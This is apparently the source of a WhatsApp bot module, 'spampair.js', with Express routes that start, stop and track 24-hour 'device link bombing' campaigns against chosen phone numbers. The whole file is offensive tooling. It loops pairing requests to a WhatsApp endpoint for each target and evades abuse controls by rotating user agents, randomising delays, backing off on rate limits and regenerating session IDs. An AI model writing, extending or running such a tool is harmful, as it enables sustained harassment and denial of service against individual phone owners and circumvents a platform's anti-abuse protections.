// ============================================================
// MODULE: spampair.js
// WhatsApp Bot command: .spampair <phone_number>
// Starts a 24-hour device link bombing campaign against the target
// ============================================================

const express = require('express');
const crypto = require('crypto');
const EventEmitter = require('events');
const axios = require('axios');

// ---------- CONFIGURATION ----------
const DEFAULT_DURATION_HOURS = 24;
const REQUEST_DELAY_MIN_MS = 800;
const REQUEST_DELAY_MAX_MS = 2500;

// ---------- STATE ----------
const activeCampaigns = new Map(); // phone -> { spamPair, stopFlag, stats, startTime }

class SpamPair extends EventEmitter {
  constructor(phoneNumber, durationHours = DEFAULT_DURATION_HOURS) {
    super();
    this.phone = this._formatNumber(phoneNumber);
    this.durationMs = durationHours * 60 * 60 * 1000;
    this.stopFlag = false;
    this.stats = { attempts: 0, success: 0, errors: 0 };
    this.sessionId = crypto.randomBytes(8).toString('hex');
    this.userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 Version/16.6 Mobile/15E148 Safari/604.1',
      'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 Chrome/120.0.6099.230 Mobile Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0'
    ];
    this._runLoop = this._runLoop.bind(this);
    this._timer = null;
    this._threads = [];
  }

  // ---------- UTILITIES ----------
  _formatNumber(num) {
    let clean = String(num || '').replace(/\D/g, '');
    if (!clean.startsWith('91')) clean = '91' + clean;
    return clean;
  }

  _randomDelay() {
    return Math.floor(Math.random() * (REQUEST_DELAY_MAX_MS - REQUEST_DELAY_MIN_MS + 1)) + REQUEST_DELAY_MIN_MS;
  }

  _randomUA() {
    return this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
  }

  _generatePairingId() {
    return crypto.randomBytes(12).toString('hex');
  }

  // ---------- SLEEP HELPER ----------
  _sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  // ---------- CORE ATTEMPT ----------
  async _attemptLink() {
    try {
      const pairingId = this._generatePairingId();
      const payload = {
        id: pairingId,
        method: 'pairing',
        number: this.phone
      };

      const response = await axios.post(
        'https://web.whatsapp.com/app/device-pairing',
        payload,
        {
          headers: {
            'User-Agent': this._randomUA(),
            'Content-Type': 'application/json',
            'Origin': 'https://web.whatsapp.com',
            'Referer': 'https://web.whatsapp.com/',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9'
          },
          timeout: 10000
        }
      );

      this.stats.attempts++;

      if (response.status === 200) {
        const data = response.data;
        if (data?.status === 'ok' || data?.pairing || JSON.stringify(data).includes('pairing')) {
          this.stats.success++;
          this.emit('success', { phone: this.phone, attempt: this.stats.attempts });
          return true;
        }
        this.stats.errors++;
        return false;
      }

      if (response.status === 429) {
        this.emit('rate-limit', { phone: this.phone });
        await this._sleep(10000);
        return false;
      }

      this.stats.errors++;
      return false;

    } catch (error) {
      this.stats.errors++;
      if (error.response?.status === 429) {
        this.emit('rate-limit', { phone: this.phone });
        await this._sleep(10000);
      }
      return false;
    }
  }

  // ---------- MAIN LOOP ----------
  async _runLoop() {
    const startTime = Date.now();
    this.emit('start', { phone: this.phone, duration: this.durationMs });

    while (!this.stopFlag && (Date.now() - startTime) < this.durationMs) {
      const success = await this._attemptLink();
      
      // Emit progress every 10 attempts
      if (this.stats.attempts % 10 === 0) {
        this.emit('progress', {
          phone: this.phone,
          attempts: this.stats.attempts,
          success: this.stats.success,
          errors: this.stats.errors,
          elapsed: Math.round((Date.now() - startTime) / 1000)
        });
      }

      // Random delay between attempts
      await this._sleep(this._randomDelay());

      // Refresh session occasionally
      if (this.stats.attempts % 50 === 0) {
        this.sessionId = crypto.randomBytes(8).toString('hex');
      }
    }

    this.emit('done', {
      phone: this.phone,
      totalAttempts: this.stats.attempts,
      totalSuccess: this.stats.success,
      totalErrors: this.stats.errors,
      durationSeconds: Math.round((Date.now() - startTime) / 1000)
    });
  }

  // ---------- START / STOP ----------
  start() {
    if (this._timer) {
      this.emit('error', { phone: this.phone, message: 'Already running' });
      return;
    }
    this.stopFlag = false;
    this._runLoop().catch(err => this.emit('error', { phone: this.phone, error: err.message }));
    return this;
  }

  stop() {
    this.stopFlag = true;
    this.emit('stopped', { phone: this.phone, stats: this.stats });
    return this;
  }

  getStats() {
    return { phone: this.phone, ...this.stats, running: !this.stopFlag };
  }
}

// ================================================================
// EXPRESS API ROUTES
// ================================================================

const router = express.Router();

// ── POST /api/spampair/start ──────────────────────────────────────
// Body: { phoneNumber }
router.post('/start', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) {
    return res.status(400).json({ error: 'Missing phoneNumber' });
  }

  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (activeCampaigns.has(cleanNumber)) {
    const campaign = activeCampaigns.get(cleanNumber);
    return res.json({
      status: 'already_running',
      phone: cleanNumber,
      stats: campaign.stats
    });
  }

  const campaign = new SpamPair(phoneNumber);
  activeCampaigns.set(cleanNumber, {
    spamPair: campaign,
    stats: campaign.stats,
    startTime: Date.now()
  });

  // Start the campaign (events are handled by case.js)
  campaign.start();

  res.json({
    status: 'started',
    phone: cleanNumber,
    sessionId: campaign.sessionId,
    durationHours: DEFAULT_DURATION_HOURS
  });
});

// ── POST /api/spampair/stop ───────────────────────────────────────
// Body: { phoneNumber }
router.post('/stop', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) {
    return res.status(400).json({ error: 'Missing phoneNumber' });
  }

  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (!activeCampaigns.has(cleanNumber)) {
    return res.status(404).json({ error: 'No active campaign for this number', phone: cleanNumber });
  }

  const entry = activeCampaigns.get(cleanNumber);
  entry.spamPair.stop();
  activeCampaigns.delete(cleanNumber);

  res.json({
    status: 'stopped',
    phone: cleanNumber,
    stats: entry.stats
  });
});

// ── GET /api/spampair/status ──────────────────────────────────────
router.get('/status', (req, res) => {
  if (activeCampaigns.size === 0) {
    return res.json({ campaigns: [] });
  }

  const campaigns = [];
  for (const [phone, entry] of activeCampaigns) {
    campaigns.push({
      phone,
      stats: entry.spamPair.getStats(),
      running: !entry.spamPair.stopFlag,
      startedAt: entry.startTime
    });
  }
  res.json({ campaigns });
});

module.exports = router;
module.exports.SpamPair = SpamPair;
module.exports.activeCampaigns = activeCampaigns;
